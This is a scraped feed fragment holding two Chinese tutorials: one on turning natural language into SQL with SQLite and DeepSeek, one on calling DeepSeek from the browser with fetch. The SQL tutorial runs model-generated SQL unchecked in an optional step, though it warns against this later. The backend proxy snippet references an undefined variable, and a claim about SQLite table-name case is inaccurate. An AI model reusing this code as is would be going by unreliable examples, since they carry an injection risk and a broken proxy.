#d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、为什么要做“自然语言转 SQL”？</h2>
<p>在数据分析、低代码平台、BI 工具等场景中，非技术人员常因不会写 SQL 而无法自助查询数据。而借助 LLM（如 DeepSeek、GPT），我们可以：</p>
<ul>
<li><strong>降低使用门槛</strong>：用户只需用自然语言提问（如“开发部员工工资多少？”）</li>
<li><strong>提升开发效率</strong>：自动生成准确 SQL，减少人工编写与调试成本</li>
<li><strong>快速验证想法</strong>：原型阶段无需构建复杂 UI，一句话即可查数据</li>
</ul>
<blockquote>
<p>✅ 本文以 <strong>SQLite + DeepSeek API</strong> 为例，展示一个最小可行方案（MVP）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、技术栈与准备</h2>

























<table><thead><tr><th>组件</th><th>说明</th></tr></thead><tbody><tr><td><strong>数据库</strong></td><td>SQLite（Python 内置，无需安装服务）</td></tr><tr><td><strong>LLM 服务</strong></td><td>DeepSeek（兼容 OpenAI API，国内可访问）</td></tr><tr><td><strong>编程语言</strong></td><td>Python 3.7+</td></tr><tr><td><strong>依赖库</strong></td><td><code>sqlite3</code>（内置）、<code>openai</code>（用于调用 DeepSeek）</td></tr></tbody></table>
<p>安装依赖：</p>
<pre><code class="hljs">bash
编辑
pip install openai
</code></pre>
<hr/>
<h2 data-id="heading-2">三、完整实现步骤</h2>
<h3 data-id="heading-3">步骤 1：创建 SQLite 表并插入示例数据</h3>
<pre><code class="hljs language-python" lang="python">python
编辑
<span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 连接数据库（若不存在则自动创建）</span>
conn = sqlite3.connect(<span class="hljs-string">"text5.db"</span>)
cursor = conn.cursor()

<span class="hljs-comment"># 创建 employees 表</span>
cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees (
    id INTEGER PRIMARY KEY,      -- 注意：原文 PRINARY 是拼写错误，应为 PRIMARY
    name TEXT,
    department TEXT,
    salary INTEGER
)
"""</span>)

<span class="hljs-comment"># 插入测试数据</span>
sample_data = [
    (<span class="hljs-number">6</span>, <span class="hljs-string">"陈老板"</span>, <span class="hljs-string">"开发部"</span>, <span class="hljs-number">100000</span>),
    (<span class="hljs-number">7</span>, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"销售部"</span>, <span class="hljs-number">20000</span>),
    (<span class="hljs-number">8</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"开发部"</span>, <span class="hljs-number">50000</span>),
    (<span class="hljs-number">9</span>, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"销售部"</span>, <span class="hljs-number">22000</span>),
]
cursor.executemany(<span class="hljs-string">'INSERT INTO employees VALUES (?, ?, ?, ?)'</span>, sample_data)
conn.commit()
</code></pre>
<blockquote>
<p>⚠️ <strong>注意</strong>：原文中 <code>PRINARY KEY</code> 是拼写错误，正确应为 <code>PRIMARY KEY</code>，否则会创建成普通列！</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">步骤 2：提取表结构（Schema）</h3>
<p>为了让 LLM 理解表结构，需提供清晰的 Schema 描述：</p>
<pre><code class="hljs language-python" lang="python">python
编辑
<span class="hljs-comment"># 获取表字段信息</span>
schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
<span class="hljs-comment"># 构造 CREATE TABLE 风格的字符串</span>
schema_str = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"    <span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"数据库 Schema:"</span>)
<span class="hljs-built_in">print</span>(schema_str)
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">sql</span>
编辑
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> EMPLOYEES (
    id <span class="hljs-type">INTEGER</span>
    name TEXT
    department TEXT
    salary <span class="hljs-type">INTEGER</span>
)
</code></pre>
<blockquote>
<p>💡 虽然缺少约束（如 PRIMARY KEY），但对简单查询已足够。更严谨的做法可解析 DDL 或补充注释。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">步骤 3：调用 LLM 生成 SQL</h3>
<p>使用 DeepSeek 的 Reasoner 模型（擅长推理任务）：</p>
<pre><code class="hljs language-ini" lang="ini">python
编辑
from openai import OpenAI

<span class="hljs-attr">client</span> = OpenAI(
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">'sk-xxxx'</span>,  <span class="hljs-comment"># 替换为你的 DeepSeek API Key</span>
    <span class="hljs-attr">base_url</span>=<span class="hljs-string">'https://api.deepseek.com/v1'</span>
)

def ask_deepseek(query: str, schema: str) -&gt; str:
    <span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""
这是一个数据库的Schema:
{schema}
根据这个Schema,你能输出一个SQL查询来回答以下问题吗？
只输出SQL查询,不要输出任何其他内容。也不要带任何格式。
问题：{query}
"""</span>
    <span class="hljs-attr">response</span> = client.chat.completions.create(
        <span class="hljs-attr">model</span>=<span class="hljs-string">"deepseek-reasoner"</span>,
        <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">2048</span>,
        <span class="hljs-attr">messages</span>=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}]
    )
    return response.choices<span class="hljs-section">[0]</span>.message.content.strip()

<span class="hljs-comment"># 测试提问</span>
<span class="hljs-attr">question</span> = <span class="hljs-string">"开发部部门员工的姓名和工资是多少？"</span>
<span class="hljs-attr">sql</span> = ask_deepseek(question, schema_str)
print("生成的 SQL 查询：")
print(sql)
</code></pre>
<p>预期输出：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">sql</span>
编辑
<span class="hljs-keyword">SELECT</span> name, salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">'开发部'</span>;
</code></pre>
<hr/>
<h3 data-id="heading-6">步骤 4：执行 SQL 并返回结果（可选）</h3>
<pre><code class="hljs language-scss" lang="scss">python
编辑
result = <span class="hljs-attribute">cursor</span><span class="hljs-selector-class">.execute</span>(sql)<span class="hljs-selector-class">.fetchall</span>()
<span class="hljs-built_in">print</span>("查询结果：", result)
# 输出：<span class="hljs-selector-attr">[(<span class="hljs-string">'陈老板'</span>, 100000), (<span class="hljs-string">'李四'</span>, 50000)]</span>
</code></pre>
<hr/>
<h2 data-id="heading-7">四、关键技巧与注意事项</h2>
<h3 data-id="heading-8">1. Prompt 设计要点</h3>
<ul>
<li><strong>明确指令</strong>：“只输出 SQL，不要解释”</li>
<li><strong>提供精确 Schema</strong>：字段名、类型必须一致</li>
<li><strong>示例引导（Few-shot）</strong> ：复杂场景可加 1~2 个例子提升准确率</li>
</ul>
<h3 data-id="heading-9">2. 常见问题与解决方案</h3>






























<table><thead><tr><th>问题</th><th>原因</th><th>解决方案</th></tr></thead><tbody><tr><td>生成无效 SQL</td><td>Schema 不清晰或字段名不匹配</td><td>使用 <code>PRAGMA table_info</code> 精确获取字段</td></tr><tr><td>返回多余文本</td><td>LLM 未严格遵循指令</td><td>在 Prompt 中强调“仅输出 SQL”</td></tr><tr><td>表名大小写错误</td><td>SQLite 默认小写</td><td>Schema 中统一用小写表名</td></tr><tr><td>拼写错误（如 PRINARY）</td><td>手动建表失误</td><td>建表时仔细检查语法</td></tr></tbody></table>
<h3 data-id="heading-10">3. 安全警告 ⚠️</h3>
<ul>
<li><strong>切勿直接执行 LLM 生成的 SQL！</strong><br/>
应进行<strong>白名单校验</strong>（如只允许 SELECT）、<strong>参数化查询</strong>，防止注入攻击。</li>
<li>生产环境建议增加 SQL 解析器（如 <code>sqlglot</code>）做语法校验。</li>
</ul>
<hr/>
<h2 data-id="heading-11">五、方案对比：不同实现方式优劣</h2>





























<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>LLM 直接生成 SQL</strong></td><td>快速、灵活、支持自然语言</td><td>可能出错、需校验</td><td>原型验证、内部工具</td></tr><tr><td><strong>模板匹配 + 规则引擎</strong></td><td>稳定、可控</td><td>扩展性差、需维护规则</td><td>固定查询模式</td></tr><tr><td><strong>专用 NL2SQL 模型（如 SQLCoder）</strong></td><td>准确率高</td><td>需部署模型、资源消耗大</td><td>企业级产品</td></tr></tbody></table>
<blockquote>
<p>✅ 对于个人项目或 MVP，<strong>LLM + Prompt 工程</strong> 是性价比最高的选择。</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">六、总结要点</h2>
<ul>
<li>✅ SQLite 轻量易用，适合本地数据存储与测试</li>
<li>✅ 通过 <code>PRAGMA table_info</code> 可程序化获取表结构</li>
<li>✅ LLM（如 DeepSeek）能有效将自然语言转为 SQL</li>
<li>✅ <strong>Prompt 要清晰、约束要明确</strong></li>
<li>❌ <strong>永远不要信任 LLM 输出，必须校验 SQL 安全性</strong></li>
</ul>
<hr/>
<h2 data-id="heading-13">七、拓展思考</h2>
<ol>
<li><strong>如何支持多表 JOIN 查询？</strong><br/>
→ 在 Schema 中提供多个表的 DDL，并在问题中明确关联字段。</li>
<li><strong>能否缓存常见问题的 SQL？</strong><br/>
→ 可建立“问题- SQL”映射缓存，提升响应速度与稳定性。</li>
<li><strong>如何评估生成 SQL 的准确率？</strong><br/>
→ 构建测试集，用执行结果 vs 人工标注结果做比对。</li>
<li><strong>前端集成？</strong><br/>
→ 用 Flask/FastAPI 封装为 REST API，前端输入问题 → 返回表格数据。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零开始：前端如何通过 `fetch` 调用 大模型（详解）]]></title>    <link>https://juejin.cn/post/7575104251866873866</link>    <guid>https://juejin.cn/post/7575104251866873866</guid>    <pubDate>2025-11-23T06:34:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866873866" data-draft-id="7575102474639327283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从零开始：前端如何通过 `fetch` 调用 大模型（详解）"/> <meta itemprop="keywords" content="前端,JavaScript,LLM"/> <meta itemprop="datePublished" content="2025-11-23T06:34:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟袅"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从零开始：前端如何通过 `fetch` 调用 大模型（详解）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟袅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:34:12.000Z" title="Sun Nov 23 2025 06:34:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 AI 应用开发中，我们经常需要在浏览器端直接调用大语言模型（LLM）的 API。虽然有 OpenAI SDK 等封装工具，但使用原生 <code>fetch</code> 发送 HTTP 请求是一种更灵活、可控且易于理解的方式。</p>
<p>本文将结合你提供的代码和笔记，深入解析 <strong>如何在前端通过 <code>fetch</code> 调用 DeepSeek 的聊天接口</strong>，并逐行解释每一个关键步骤。</p>
<hr/>
<h2 data-id="heading-0">🧩 一、完整的调用代码</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// llm api 地址</span>
<span class="hljs-keyword">const</span> endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;

<span class="hljs-comment">// 请求头</span>
<span class="hljs-keyword">const</span> headers = {
  <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
};

<span class="hljs-comment">// 请求体</span>
<span class="hljs-keyword">const</span> payload = {
  <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-chat'</span>,
  <span class="hljs-attr">messages</span>: [
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'system'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'You are a helpful assistant.'</span> },
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'你好 Deepseek'</span> }
  ]
};

<span class="hljs-comment">// 发起请求</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  headers,
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
});

<span class="hljs-comment">// 解析响应</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">// 显示结果</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'reply'</span>).<span class="hljs-property">textContent</span> = data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
</code></pre>
<p>这段代码实现了从用户输入到模型回复的完整流程。下面我们逐部分拆解。</p>
<hr/>
<h2 data-id="heading-1">🔍 二、HTTP 请求结构解析（结合你的笔记）</h2>
<h3 data-id="heading-2">1. 请求行（Request Line）</h3>
<pre><code class="hljs language-bash" lang="bash">POST /chat/completions HTTP/1.1
Host: api.deepseek.com
</code></pre>
<ul>
<li><code>POST</code>：必须使用 POST 方法，因为 API 接口要求；</li>
<li><code>/chat/completions</code>：DeepSeek 的聊天接口路径；</li>
<li><code>HTTP/1.1</code>：标准版本，浏览器自动处理。</li>
</ul>
<hr/>
<h3 data-id="heading-3">2. 请求头（Headers）</h3>
<pre><code class="hljs language-css" lang="css">{
  '<span class="hljs-attribute">Content</span>-Type': <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer sk-xxxxxx'</span>
}
</code></pre>
<ul>
<li><code>'Content-Type': 'application/json'</code><br/>
告诉服务器请求体是 JSON 格式，这是必需的。</li>
<li><code>'Authorization': 'Bearer &lt;key&gt;'</code><br/>
认证方式，<code>Bearer</code> 是固定前缀，后面跟你的 API Key。</li>
</ul>
<blockquote>
<p>⚠️ 注意：API Key 不能硬编码在前端代码中，应通过 Vite 的环境变量管理：</p>
<pre><code class="hljs language-ini" lang="ini">// .env 文件
<span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxx
</code></pre>
<p>在代码中使用 <code>import.meta.env.VITE_DEEPSEEK_API_KEY</code> 获取。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">3. 请求体（Body）</h3>
<pre><code class="hljs language-css" lang="css">{
  model: <span class="hljs-string">'deepseek-chat'</span>,
  messages: [
    { role: <span class="hljs-string">'system'</span>, content: <span class="hljs-string">'You are a helpful assistant.'</span> },
    { role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'你好 Deepseek'</span> }
  ]
}
</code></pre>
<ul>
<li>
<p><code>model</code>：指定使用的模型名称；</p>
</li>
<li>
<p><code>messages</code>：对话历史，支持多轮交互；</p>
<ul>
<li><code>role: "system"</code>：设定助手行为；</li>
<li><code>role: "user"</code>：用户的提问内容。</li>
</ul>
</li>
</ul>
<blockquote>
<p>✅ 注意：<strong>请求体必须是字符串化后的 JSON</strong>，所以要用 <code>JSON.stringify()</code>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">4. 使用 <code>fetch</code> 发送请求</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  headers,
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
});
</code></pre>
<ul>
<li><code>method: 'POST'</code>：发送 POST 请求；</li>
<li><code>headers</code>：设置请求头；</li>
<li><code>body: JSON.stringify(payload)</code>：将 JS 对象转为字符串，<strong>不能直接传对象</strong>。</li>
</ul>
<blockquote>
<p>💡 <code>await</code> 比 <code>.then()</code> 更直观，适合异步操作。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">5. 处理响应</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">data</span> = await response.json()<span class="hljs-comment">;</span>
console.log(data)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li><code>response.json()</code> 将响应体解析为 JavaScript 对象；</li>
<li><code>data.choices[0].message.content</code> 是模型返回的文本。</li>
</ul>
<hr/>
<h3 data-id="heading-7">6. 显示结果</h3>
<pre><code class="hljs language-ini" lang="ini">document.getElementById('reply').<span class="hljs-attr">textContent</span> = data.choices[<span class="hljs-number">0</span>].message.content<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>将模型回复显示在页面上（假设有一个 id 为 <code>reply</code> 的元素）。</li>
</ul>
<hr/>
<h2 data-id="heading-8">🔄 三、异步处理：<code>.then</code> vs <code>await</code></h2>
<p>你提到：</p>
<blockquote>
<p><code>- await 异步变同步比 then 更方便</code></p>
</blockquote>
<p>✅ 完全正确！</p>

















<table><thead><tr><th>方式</th><th>特点</th></tr></thead><tbody><tr><td><code>.then()</code></td><td>链式调用，适合复杂逻辑</td></tr><tr><td><code>await</code></td><td>代码像同步一样，更易读</td></tr></tbody></table>
<p>推荐使用 <code>await</code>，尤其是在处理多个异步操作时。</p>
<hr/>
<h2 data-id="heading-9">🔐 四、安全建议：API Key 的存放位置</h2>
<h3 data-id="heading-10">❌ 不推荐（前端暴露）</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">apiKey</span> = <span class="hljs-string">'sk-xxxxxxxx'</span><span class="hljs-comment">; // 直接写在代码里 → 容易泄露</span>
</code></pre>
<h3 data-id="heading-11">✅ 推荐（后端代理）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端路由</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/chat'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>, {
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${process.env.DEEPSEEK_API_KEY}</span>`</span> <span class="hljs-comment">// 后端环境变量，安全！</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>)
  });
  res.<span class="hljs-title function_">json</span>(result);
});
</code></pre>
<p>然后前端只调用自己的 <code>/api/chat</code>，<strong>永远看不到真实 API Key</strong>。</p>
<hr/>
<h2 data-id="heading-12">✅ 五、总结：前端调用 LLM 的核心要点</h2>





































<table><thead><tr><th>要点</th><th>说明</th></tr></thead><tbody><tr><td>✅ 使用 <code>fetch</code> 发送 POST 请求</td><td>标准方式，兼容性强</td></tr><tr><td>✅ 设置 <code>Content-Type: application/json</code></td><td>必须</td></tr><tr><td>✅ 添加 <code>Authorization: Bearer &lt;key&gt;</code></td><td>认证必要</td></tr><tr><td>✅ 使用 <code>JSON.stringify()</code> 处理请求体</td><td>不能直接发送 JS 对象</td></tr><tr><td>✅ 使用 <code>await</code> 处理异步</td><td>更简洁</td></tr><tr><td>✅ 环境变量管理 API Key</td><td>Vite 支持 <code>VITE_</code> 开头变量</td></tr><tr><td>⚠️ 不要在生产环境中暴露 API Key</td><td>必须走后端代理</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-13">🎯 结语</h2>
<blockquote>
<p><strong>技术的本质是解决问题，而不是追求“高大上”的工具。</strong></p>
</blockquote>
<p>当你理解了 <code>fetch</code> 的工作原理，就能轻松对接任何符合 OpenAI 协议的 LLM 服务。无论是 DeepSeek、Qwen 还是其他模型，只要你知道它的 API 地址和参数格式，就可以用这段代码快速接入。</p>
<p>希望这篇文章帮你彻底搞懂了前端调用 LLM 的全过程！<br/>
